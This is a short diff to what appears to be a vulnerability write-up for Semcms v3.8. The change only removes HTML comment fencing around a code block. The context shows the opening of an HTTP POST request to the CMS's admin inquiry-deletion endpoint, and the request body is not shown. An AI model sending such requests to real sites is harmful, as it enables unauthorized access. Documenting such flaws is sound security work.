@@ -56,9 +56,8 @@ Semcms v3.8
 
 -   POST
 
-```{=html}
 <!-- -->
-```
+
     POST /123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&CF=Inquriy&page= HTTP/1.1
     Host: 0-sec.org
     Content-Length: 24
